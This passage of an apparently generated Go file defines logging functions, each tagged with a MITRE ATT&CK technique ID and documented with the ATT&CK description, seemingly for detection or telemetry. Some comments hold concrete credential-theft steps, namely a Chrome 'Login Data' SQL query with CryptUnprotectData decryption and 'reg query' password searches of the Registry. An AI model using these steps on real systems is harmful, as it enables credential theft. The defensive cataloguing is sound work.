authentication cookies from visitors.(Citation: ATT ScanBox) Credential
information may also be exposed to adversaries via leaks to online or other
accessible data sets (ex: Search Engines, breach dumps, code repositories,
etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify
Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub
truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also
purchase credentials from dark web or other black-markets. Gathering this
information may reveal opportunities for other forms of reconnaissance (ex:
Search Open Websites/Domains or Phishing for Information), establishing
operational resources (ex: Compromise Accounts), and/or initial access (ex:
External Remote Services or Valid Accounts).
*/
func (g *Session) ATTACKEntCredentials(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1589.001").
        Msg("credentials")
}

/* ATTACKEntCredentialsInFiles Phases: credential-access

Adversaries may search local file systems and remote file shares for files
containing insecurely stored credentials. These can be files created by users to
store their own credentials, shared credential stores for a group of
individuals, configuration files containing passwords for a system or service,
or source code/binary files containing embedded passwords. It is possible to
extract passwords from backups or saved virtual machines through OS Credential
Dumping. (Citation: CG 2014) Passwords may also be obtained from Group Policy
Preferences stored on the Windows Domain Controller. (Citation: SRD GPP) In
cloud and/or containerized environments, authenticated user and service account
credentials are often stored in local configuration and credential
files.(Citation: Unit 42 Hildegard Malware) They may also be found as parameters
to deployment commands in container logs.(Citation: Unit 42 Unsecured Docker
Daemons) In some cases, these files can be copied and reused on another machine
or the contents can be read and then used to authenticate without needing to
copy any files.(Citation: Specter Ops - Cloud Credential Storage)
*/
func (g *Session) ATTACKEntCredentialsInFiles(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552.001").
        Msg("credentials in files")
}

/* ATTACKEntCredentialsfromPasswordStores Phases: credential-access

Adversaries may search for common password storage locations to obtain user
credentials. Passwords are stored in several places on a system, depending on
the operating system or application holding the credentials. There are also
specific applications that store passwords to make it easier for users manage
and maintain. Once credentials are obtained, they can be used to perform lateral
movement and access restricted information.
*/
func (g *Session) ATTACKEntCredentialsfromPasswordStores(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1555").
        Msg("credentials from password stores")
}

/* ATTACKEntCredentialsfromWebBrowsers Phases: credential-access

Adversaries may acquire credentials from web browsers by reading files specific
to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers
commonly save credentials such as website usernames and passwords so that they
do not need to be entered manually in the future. Web browsers typically store
the credentials in an encrypted format within a credential store; however,
methods exist to extract plaintext credentials from web browsers. For example,
on Windows systems, encrypted credentials may be obtained from Google Chrome by
reading a database file, AppData\Local\Google\Chrome\User Data\Default\Login
Data and executing a SQL query: SELECT action_url, username_value,
password_value FROM logins;. The plaintext password can then be obtained by
passing the encrypted credentials to the Windows API function
CryptUnprotectData, which uses the victim’s cached logon credentials as the
decryption key. (Citation: Microsoft CryptUnprotectData April 2018) Adversaries
have executed similar procedures for common web browsers such as FireFox,
Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May
2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet
Explorer and Microsoft Edge credentials in Credential Lockers managed by the
Windows Credential Manager. Adversaries may also acquire credentials by
searching web browser process memory for patterns that commonly match
credentials.(Citation: GitHub Mimikittenz July 2016) After acquiring credentials
from web browsers, adversaries may attempt to recycle the credentials across
different systems and/or accounts in order to expand access. This can result in
significantly furthering an adversary's objective in cases where credentials
gained from web browsers overlap with privileged accounts (e.g. domain
administrator).
*/
func (g *Session) ATTACKEntCredentialsfromWebBrowsers(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1555.003").
        Msg("credentials from web browsers")
}

/* ATTACKEntCredentialsinRegistry Phases: credential-access

Adversaries may search the Registry on compromised systems for insecurely stored
credentials. The Windows Registry stores configuration information that can be
used by the system or other programs. Adversaries may query the Registry looking
for credentials and passwords that have been stored for use by other programs or
services. Sometimes these credentials are used for automatic logons. Example
commands to find Registry keys related to password information: (Citation:
Pentestlab Stored Credentials)  Local Machine Hive: reg query HKLM /f password
/t REG_SZ /s Current User Hive: reg query HKCU /f password /t REG_SZ /s
*/
func (g *Session) ATTACKEntCredentialsinRegistry(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552.002").
        Msg("credentials in registry")
}

/* ATTACKEntCron Phases: execution persistence privilege-escalation

Adversaries may abuse the cron utility to perform task scheduling for initial or
recurring execution of malicious code. The cron utility is a time-based job
scheduler for Unix-like operating systems.  The  crontab file contains the
schedule of cron entries to be run and the specified times for execution. Any
crontab files are stored in operating system-specific file paths. An adversary
may use cron in Linux or Unix environments to execute programs at system startup
or on a scheduled basis for persistence. cron can also be abused to conduct
remote Execution as part of Lateral Movement and or to run a process under the
context of a specified account.
*/
func (g *Session) ATTACKEntCron(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053.003").
        Msg("cron")
}

/* ATTACKEntDCSync Phases: credential-access

Adversaries may attempt to access credentials and other sensitive information by
abusing a Windows Domain Controller's application programming interface
(API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges)
(Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the
replication process from a remote domain controller using a technique called
DCSync. Members of the Administrators, Domain Admins, and Enterprise Admin
groups or computer accounts on the domain controller are able to run DCSync to
pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory,
which may include current and historical hashes of potentially useful accounts
such as KRBTGT and Administrators. The hashes can then in turn be used to create
a Golden Ticket for use in Pass the Ticket(Citation: Harmj0y Mimikatz and
DCSync) or change an account's password as noted in Account
Manipulation.(Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality
has been included in the "lsadump" module in Mimikatz.(Citation: GitHub Mimikatz
lsadump Module) Lsadump also includes NetSync, which performs DCSync over a
legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)
*/
func (g *Session) ATTACKEntDCSync(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.006").
        Msg("dcsync")
}

/* ATTACKEntDLLSearchOrderHijacking Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking the search
order used to load DLLs. Windows systems use a common method to look for
required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library
Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be
for the purpose of establishing persistence as well as elevating privileges
and/or evading restrictions on file execution. There are many ways an adversary
can hijack DLL loads. Adversaries may plant trojan dynamic-link library files
(DLLs) in a directory that will be searched before the location of a legitimate
library that will be requested by a program, causing Windows to load their
malicious library when it is called for by the victim program. Adversaries may
also perform DLL preloading, also called binary planting attacks, (Citation:
OWASP Binary Planting) by placing a malicious DLL with the same name as an
ambiguously specified DLL in a location that Windows searches before the
legitimate DLL. Often this location is the current working directory of the
program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur
when a program sets its current directory to a remote location such as a Web
share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)
Adversaries may also directly modify the search order via DLL redirection, which
after being enabled (in the Registry and creation of a redirection file) may
cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link
Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search
Order Hijacking) If a search order-vulnerable program is configured to run at a
higher privilege level, then the adversary-controlled DLL that is loaded will
also be executed at the higher level. In this case, the technique could be used
for privilege escalation from user to administrator or SYSTEM or from
administrator to SYSTEM, depending on the program. Programs that fall victim to
path hijacking may appear to behave normally because malicious DLLs may be
configured to also load the legitimate DLLs they were meant to replace.
*/
func (g *Session) ATTACKEntDLLSearchOrderHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.001").
        Msg("dll search order hijacking")
}

/* ATTACKEntDLLSideLoading Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by side-loading DLLs.
Similar to DLL Search Order Hijacking, side-loading involves hijacking which DLL
a program loads. But rather than just planting the DLL within the search order
of a program then waiting for the victim application to be invoked, adversaries
may directly side-load their payloads by planting then invoking a legitimate
application that executes their payload(s). Side-loading takes advantage of the
DLL search order used by the loader by positioning both the victim application
and malicious payload(s) alongside each other. Adversaries likely use side-
loading as a means of masking actions they perform under a legitimate, trusted,
and potentially elevated system or software process. Benign executables used to
side-load payloads may not be flagged during delivery and/or execution.
Adversary payloads may also be encrypted/packed or otherwise obfuscated until
loaded into the memory of the trusted process.(Citation: FireEye DLL Side-
Loading)
*/
func (g *Session) ATTACKEntDLLSideLoading(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.002").
        Msg("dll side-loading")
}

/* ATTACKEntDNS Phases: command-and-control

Adversaries may communicate using the Domain Name System (DNS) application layer
protocol to avoid detection/network filtering by blending in with existing
traffic. Commands to the remote system, and often the results of those commands,
will be embedded within the protocol traffic between the client and server.  The
DNS protocol serves an administrative function in computer networking and thus
may be very common in environments. DNS traffic may also be allowed even before
network authentication is completed. DNS packets contain many fields and headers
in which data can be concealed. Often known as DNS tunneling, adversaries may
abuse DNS to communicate with systems under their control within a victim
network while also mimicking normal, expected traffic.(Citation: PAN DNS
Tunneling)(Citation: Medium DnsTunneling)
*/
func (g *Session) ATTACKEntDNS(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1071.004").
        Msg("dns")
}

/* ATTACKEntDNS2 Phases: reconnaissance

Adversaries may gather information about the victim's DNS that can be used
during targeting. DNS information may include a variety of details, including
registered name servers as well as records that outline addressing for a
target’s subdomains, mail servers, and other hosts. Adversaries may gather this
information in various ways, such as querying or otherwise collecting details
via DNS/Passive DNS. DNS information may also be exposed to adversaries via
online or other accessible data sets (ex: Search Open Technical
Databases).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this
information may reveal opportunities for other forms of reconnaissance (ex:
Search Open Technical Databases, Search Open Websites/Domains, or Active
Scanning), establishing operational resources (ex: Acquire Infrastructure or
Compromise Infrastructure), and/or initial access (ex: External Remote
Services).
*/
func (g *Session) ATTACKEntDNS2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1590.002").
        Msg("dns")
}

/* ATTACKEntDNSCalculation Phases: command-and-control

Adversaries may perform calculations on addresses returned in DNS results to
determine which port and IP address to use for command and control, rather than
relying on a predetermined port number or the actual returned IP address. A IP
and/or port number calculation can be used to bypass egress filtering on a C2
channel.(Citation: Meyers Numbered Panda) One implementation of DNS Calculation
is to take the first three octets of an IP address in a DNS response and use
those values to calculate the port for command and control traffic.(Citation:
Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)
*/
func (g *Session) ATTACKEntDNSCalculation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1568.003").
        Msg("dns calculation")
}

/* ATTACKEntDNSServer Phases: resource-development

Adversaries may set up their own Domain Name System (DNS) servers that can be
used during targeting. During post-compromise activity, adversaries may utilize
DNS traffic for various tasks, including for Command and Control (ex:
Application Layer Protocol). Instead of hijacking existing DNS servers,
adversaries may opt to configure and run their own DNS servers in support of
operations. By running their own DNS servers, adversaries can have more control
over how they administer server-side DNS C2 traffic (DNS). With control over a
DNS server, adversaries can configure DNS applications to provide conditional
responses to malware and, generally, have more flexibility in the structure of
the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)
*/
func (g *Session) ATTACKEntDNSServer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1583.002").
        Msg("dns server")
}

/* ATTACKEntDNSServer2 Phases: resource-development

Adversaries may compromise third-party DNS servers that can be used during
targeting. During post-compromise activity, adversaries may utilize DNS traffic
for various tasks, including for Command and Control (ex: Application Layer
Protocol). Instead of setting up their own DNS servers, adversaries may
compromise third-party DNS servers in support of operations. By compromising DNS
servers, adversaries can alter DNS records. Such control can allow for
redirection of an organization's traffic, facilitating Collection and Credential
Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation:
FireEye DNS Hijack 2019) Adversaries may also be able to silently create
subdomains pointed at malicious servers without tipping off the actual owner of
the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)
*/
func (g *Session) ATTACKEntDNSServer2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1584.002").
        Msg("dns server")
}

/* ATTACKEntDNSPassiveDNS Phases: reconnaissance

Adversaries may search DNS data for information about victims that can be used
during targeting. DNS information may include a variety of details, including
registered name servers as well as records that outline addressing for a
target’s subdomains, mail servers, and other hosts. Adversaries may search DNS
data to gather actionable information. Threat actors can query nameservers for a
target organization directly, or search through centralized repositories of
logged DNS query responses (known as passive DNS).(Citation: DNS
Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS
misconfigurations/leaks that reveal information about internal networks.
Information from these sources may reveal opportunities for other forms of
reconnaissance (ex: Search Victim-Owned Websites or Search Open
Websites/Domains), establishing operational resources (ex: Acquire
Infrastructure or Compromise Infrastructure), and/or initial access (ex:
External Remote Services or Trusted Relationship).
*/
func (g *Session) ATTACKEntDNSPassiveDNS(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1596.001").
        Msg("dns/passive dns")
}

/* ATTACKEntDataDestruction Phases: impact

Adversaries may destroy data and files on specific systems or in large numbers
on a network to interrupt availability to systems, services, and network
resources. Data destruction is likely to render stored data irrecoverable by
forensic techniques through overwriting files or data on local and remote
drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov
2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill
2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018)
Common operating system file deletion commands such as del and rm often only
remove pointers to files without wiping the contents of the files themselves,
making the files recoverable by proper forensic methodology. This behavior is
distinct from Disk Content Wipe and Disk Structure Wipe because individual files
are destroyed rather than sections of a storage disk or the disk's logical
structure. Adversaries may attempt to overwrite files and directories with
randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill
2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image
files have been used to overwrite data.(Citation: FireEye Shamoon Nov
2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)
To maximize impact on the target organization in operations where network-wide
availability interruption is the goal, malware designed for destroying data may
have worm-like features to propagate across a network by leveraging additional
techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin
Shares.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov
2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill
2017)(Citation: Talos Olympic Destroyer 2018). In cloud environments,
adversaries may leverage access to delete cloud storage, cloud storage accounts,
machine images, and other infrastructure crucial to operations to damage an
organization or their customers.(Citation: Data Destruction - Threat
Post)(Citation: DOJ  - Cisco Insider)
*/
func (g *Session) ATTACKEntDataDestruction(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1485").
        Msg("data destruction")
}

/* ATTACKEntDataEncoding Phases: command-and-control

Adversaries may encode data to make the content of command and control traffic
more difficult to detect. Command and control (C2) information can be encoded
using a standard data encoding system. Use of data encoding may adhere to
existing protocol specifications and includes use of ASCII, Unicode, Base64,
MIME, or other binary-to-text and character encoding systems.(Citation:
Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some
data encoding systems may also result in data compression, such as gzip.
*/
func (g *Session) ATTACKEntDataEncoding(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1132").
        Msg("data encoding")
}

/* ATTACKEntDataEncryptedforImpact Phases: impact

Adversaries may encrypt data on target systems or on large numbers of systems in
a network to interrupt availability to system and network resources. They can
attempt to render stored data inaccessible by encrypting files or data on local
and remote drives and withholding access to a decryption key. This may be done
in order to extract monetary compensation from a victim in exchange for
decryption or a decryption key (ransomware) or to render data permanently
inaccessible in cases where the key is not saved or transmitted.(Citation: US-
CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT
NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is
typical that common user files like Office documents, PDFs, images, videos,
audio, text, and source code files will be encrypted. In some cases, adversaries
may encrypt critical system files, disk partitions, and the MBR.(Citation: US-
CERT NotPetya 2017) To maximize impact on the target organization, malware
designed for encrypting data may have worm-like features to propagate across a
network by leveraging other attack techniques like Valid Accounts, OS Credential
Dumping, and SMB/Windows Admin Shares.(Citation: FireEye WannaCry
2017)(Citation: US-CERT NotPetya 2017) In cloud environments, storage objects
within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware
Part 1)
*/
func (g *Session) ATTACKEntDataEncryptedforImpact(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1486").
        Msg("data encrypted for impact")
}

/* ATTACKEntDataManipulation Phases: impact

Adversaries may insert, delete, or manipulate data in order to manipulate
external outcomes or hide activity. By manipulating data, adversaries may
attempt to affect a business process, organizational understanding, or decision
making. The type of modification and the impact it will have depends on the
target application and process as well as the goals and objectives of the
adversary. For complex systems, an adversary would likely need special expertise
and possibly access to specialized software related to the system that would
typically be gained through a prolonged information gathering campaign in order
to have the desired impact.
*/
func (g *Session) ATTACKEntDataManipulation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1565").
        Msg("data manipulation")
}

/* ATTACKEntDataObfuscation Phases: command-and-control

Adversaries may obfuscate command and control traffic to make it more difficult
to detect. Command and control (C2) communications are hidden (but not
necessarily encrypted) in an attempt to make the content more difficult to
discover or decipher and to make the communication less conspicuous and hide
commands from being seen. This encompasses many methods, such as adding junk
data to protocol traffic, using steganography, or impersonating legitimate
protocols.
*/
func (g *Session) ATTACKEntDataObfuscation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1001").
        Msg("data obfuscation")
}

/* ATTACKEntDataStaged Phases: collection

Adversaries may stage collected data in a central location or directory prior to
Exfiltration. Data may be kept in separate files or combined into one file
through techniques such as Archive Collected Data. Interactive command shells
may be used, and common functionality within cmd and bash may be used to copy
data into a staging location.(Citation: PWC Cloud Hopper April 2017) In cloud
environments, adversaries may stage data within a particular instance or virtual
machine before exfiltration. An adversary may Create Cloud Instance and stage
data in that instance.(Citation: Mandiant M-Trends 2020) Adversaries may choose
to stage data from a victim network in a centralized location prior to
Exfiltration to minimize the number of connections made to their C2 server and
better evade detection.
*/
func (g *Session) ATTACKEntDataStaged(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1074").
        Msg("data staged")
}

/* ATTACKEntDataTransferSizeLimits Phases: exfiltration

An adversary may exfiltrate data in fixed size chunks instead of whole files or
limit packet sizes below certain thresholds. This approach may be used to avoid
triggering network data transfer threshold alerts.
*/
func (g *Session) ATTACKEntDataTransferSizeLimits(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1030").
        Msg("data transfer size limits")
}

/* ATTACKEntDatafromCloudStorageObject Phases: collection

Adversaries may access data objects from improperly secured cloud storage. Many
cloud service providers offer solutions for online data storage such as Amazon
S3, Azure Storage, and Google Cloud Storage. These solutions differ from other
storage solutions (such as SQL or Elasticsearch) in that there is no overarching
application. Data from these solutions can be retrieved directly using the cloud
provider's APIs. Solution providers typically offer security guides to help end
users configure systems.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft
Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices,
2019) Misconfiguration by end users is a common problem. There have been
numerous incidents where cloud storage has been improperly secured (typically by
unintentionally allowing public access by unauthenticated users or overly-broad
access by all users), allowing open access to credit cards, personally
identifiable information, medical records, and other sensitive
information.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired
Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017) Adversaries
may also obtain leaked credentials in source repositories, logs, or other means
as a way to gain access to cloud storage objects that have access permission
controls.
*/
func (g *Session) ATTACKEntDatafromCloudStorageObject(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1530").
        Msg("data from cloud storage object")
}

/* ATTACKEntDatafromConfigurationRepository Phases: collection

Adversaries may collect data related to managed devices from configuration
repositories. Configuration repositories are used by management systems in order
to configure, manage, and control data on remote systems. Configuration
repositories may also facilitate remote access and administration of devices.
Adversaries may target these repositories in order to collect large quantities
of sensitive system administration data. Data from configuration repositories
may be exposed by various protocols and software and can store a wide variety of
data, much of which may align with adversary Discovery objectives.(Citation: US-
CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)
*/
func (g *Session) ATTACKEntDatafromConfigurationRepository(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1602").
        Msg("data from configuration repository")
}

/* ATTACKEntDatafromInformationRepositories Phases: collection

Adversaries may leverage information repositories to mine valuable information.
Information repositories are tools that allow for storage of information,
typically to facilitate collaboration or information sharing between users, and
can store a wide variety of data that may aid adversaries in further objectives,
or direct access to the target information. The following is a brief list of
example information that may hold potential value to an adversary and may also
be found on an information repository:  Policies, procedures, and standards
Physical / logical network diagrams System architecture diagrams Technical
system documentation Testing / development credentials Work / project schedules
Source code snippets Links to network shares and other internal resources
Information stored in a repository may vary based on the specific instance or
environment. Specific common information repositories include Sharepoint,
Confluence, and enterprise databases such as SQL Server.
*/
func (g *Session) ATTACKEntDatafromInformationRepositories(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1213").
        Msg("data from information repositories")
}

/* ATTACKEntDatafromLocalSystem Phases: collection

Adversaries may search local system sources, such as file systems or local
databases, to find files of interest and sensitive data prior to Exfiltration.
Adversaries may do this using a Command and Scripting Interpreter, such as cmd,
which has functionality to interact with the file system to gather information.
Some adversaries may also use Automated Collection on the local system.
*/
func (g *Session) ATTACKEntDatafromLocalSystem(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1005").
        Msg("data from local system")
}

/* ATTACKEntDatafromNetworkSharedDrive Phases: collection

Adversaries may search network shares on computers they have compromised to find
files of interest. Sensitive data can be collected from remote systems via
shared network drives (host shared directory, network file server, etc.) that
are accessible from the current system prior to Exfiltration. Interactive
command shells may be in use, and common functionality within cmd may be used to
gather information.
*/
func (g *Session) ATTACKEntDatafromNetworkSharedDrive(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1039").
        Msg("data from network shared drive")
}

/* ATTACKEntDatafromRemovableMedia Phases: collection

Adversaries may search connected removable media on computers they have
compromised to find files of interest. Sensitive data can be collected from any
removable media (optical disk drive, USB memory, etc.) connected to the
compromised system prior to Exfiltration. Interactive command shells may be in
use, and common functionality within cmd may be used to gather information.
Some adversaries may also use Automated Collection on removable media.
*/
func (g *Session) ATTACKEntDatafromRemovableMedia(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1025").
        Msg("data from removable media")
}

/* ATTACKEntDeadDropResolver Phases: command-and-control

Adversaries may use an existing, legitimate external Web service to host
information that points to additional command and control (C2) infrastructure.
Adversaries may post content, known as a dead drop resolver, on Web services
with embedded (and often obfuscated/encoded) domains or IP addresses. Once
infected, victims will reach out to and be redirected by these resolvers.
Popular websites and social media acting as a mechanism for C2 may give a
significant amount of cover due to the likelihood that hosts within a network
are already communicating with them prior to a compromise. Using common
services, such as those offered by Google or Twitter, makes it easier for
adversaries to hide in expected noise. Web service providers commonly use
SSL/TLS encryption, giving adversaries an added level of protection. Use of a
dead drop resolver may also protect back-end C2 infrastructure from discovery
through malware binary analysis while also enabling operational resiliency
(since this infrastructure may be dynamically changed).
*/
func (g *Session) ATTACKEntDeadDropResolver(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1102.001").
        Msg("dead drop resolver")
}

/* ATTACKEntDefacement Phases: impact

Adversaries may modify visual content available internally or externally to an
enterprise network. Reasons for Defacement include delivering messaging,
intimidation, or claiming (possibly false) credit for an intrusion. Disturbing
or offensive images may be used as a part of Defacement in order to cause user
discomfort, or to pressure compliance with accompanying messages.
*/
func (g *Session) ATTACKEntDefacement(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1491").
        Msg("defacement")
}

/* ATTACKEntDefaultAccounts Phases: defense-evasion persistence privilege-escalation initial-access

Adversaries may obtain and abuse credentials of a default account as a means of
gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.
Default accounts are those that are built-into an OS, such as the Guest or
Administrator accounts on Windows systems. Default accounts also include default
factory/provider set accounts on other types of systems, software, or devices,
including the root user account in AWS and the default service account in
Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root
User)(Citation: Threat Matrix for Kubernetes) Default accounts are not limited
to client machines, rather also include accounts that are preset for equipment
such as network devices and computer applications whether they are internal,
open source, or commercial. Appliances that come preset with a username and
password combination pose a serious threat to organizations that do not change
it post installation, as they are easy targets for an adversary. Similarly,
adversaries may also utilize publicly disclosed or stolen Private Keys or
credential materials to legitimately connect to remote environments via Remote
Services.(Citation: Metasploit SSH Module)
*/
func (g *Session) ATTACKEntDefaultAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1078.001").
        Msg("default accounts")
}

/* ATTACKEntDeleteCloudInstance Phases: defense-evasion

An adversary may delete a cloud instance after they have performed malicious
activities in an attempt to evade detection and remove evidence of their
presence.  Deleting an instance or virtual machine can remove valuable forensic
artifacts and other evidence of suspicious behavior if the instance is not
recoverable. An adversary may also Create Cloud Instance and later terminate the
instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)
*/
func (g *Session) ATTACKEntDeleteCloudInstance(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1578.003").
        Msg("delete cloud instance")
}

/* ATTACKEntDeobfuscateDecodeFilesorInformation Phases: defense-evasion

Adversaries may use Obfuscated Files or Information to hide artifacts of an
intrusion from analysis. They may require separate mechanisms to decode or
deobfuscate that information depending on how they intend to use it. Methods for
doing that include built-in functionality of malware or by using utilities
present on the system. One such example is use of certutil to decode a remote
access tool portable executable file that has been hidden inside a certificate
file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another
example is using the Windows copy /b command to reassemble binary fragments into
a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016) Sometimes a
user's action may be required to open it for deobfuscation or decryption as part
of User Execution. The user may also be required to input a password to open a
password protected compressed/encrypted file that was provided by the adversary.
(Citation: Volexity PowerDuke November 2016)
*/
func (g *Session) ATTACKEntDeobfuscateDecodeFilesorInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1140").
        Msg("deobfuscate/decode files or information")
}

/* ATTACKEntDeployContainer Phases: defense-evasion execution

Adversaries may deploy a container into an environment to facilitate execution
or evade defenses. In some cases, adversaries may deploy a new container to
execute processes associated with a particular image or deployment, such as
processes that execute or download malware. In others, an adversary may deploy a
new container configured without network rules, user limitations, etc. to bypass
existing defenses within the environment. Containers can be deployed by various
means, such as via Docker's create and start APIs or via a web application such
as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers
API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries
may deploy containers based on retrieved or built malicious images or from
benign images that download and execute malicious payloads at runtime.(Citation:
Aqua Build Images on Hosts)
*/
func (g *Session) ATTACKEntDeployContainer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1610").
        Msg("deploy container")
}

/* ATTACKEntDeterminePhysicalLocations Phases: reconnaissance

Adversaries may gather the victim's physical location(s) that can be used during
targeting. Information about physical locations of a target organization may
include a variety of details, including where key resources and infrastructure
are housed. Physical locations may also indicate what legal jurisdiction and/or
authorities the victim operates within. Adversaries may gather this information
in various ways, such as direct elicitation via Phishing for Information.
Physical locations of a target organization may also be exposed to adversaries
via online or other accessible data sets (ex: Search Victim-Owned Websites or
Social Media).(Citation: ThreatPost Broadvoice Leak)(Citation: DOB Business
Lookup) Gathering this information may reveal opportunities for other forms of
reconnaissance (ex: Phishing for Information or Search Open Websites/Domains),
establishing operational resources (ex: Develop Capabilities or Obtain
Capabilities), and/or initial access (ex: Phishing or Hardware Additions).
*/
func (g *Session) ATTACKEntDeterminePhysicalLocations(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1591.001").
        Msg("determine physical locations")
}

/* ATTACKEntDevelopCapabilities Phases: resource-development

Adversaries may build capabilities that can be used during targeting. Rather
than purchasing, freely downloading, or stealing capabilities, adversaries may
develop their own capabilities in-house. This is the process of identifying
development requirements and building solutions such as malware, exploits, and
self-signed certificates. Adversaries may develop capabilities to support their
operations throughout numerous phases of the adversary lifecycle.(Citation:
Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June
2020)(Citation: Talos Promethium June 2020) As with legitimate development
efforts, different skill sets may be required for developing capabilities. The
skills needed may be located in-house, or may need to be contracted out. Use of
a contractor may be considered an extension of that adversary's development
capabilities, provided the adversary plays a role in shaping requirements and
maintains a degree of exclusivity to the capability.
*/
func (g *Session) ATTACKEntDevelopCapabilities(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1587").
        Msg("develop capabilities")
}

/* ATTACKEntDigitalCertificates Phases: resource-development

Adversaries may create self-signed SSL/TLS certificates that can be used during
targeting. SSL/TLS certificates are designed to instill trust. They include
information about the key, information about its owner's identity, and the
digital signature of an entity that has verified the certificate's contents are
correct. If the signature is valid, and the person examining the certificate
trusts the signer, then they know they can use that key to communicate with its
owner. In the case of self-signing, digital certificates will lack the element
of trust associated with the signature of a third-party certificate authority
(CA). Adversaries may create self-signed SSL/TLS certificates that can be used
to further their operations, such as encrypting C2 traffic (ex: Asymmetric
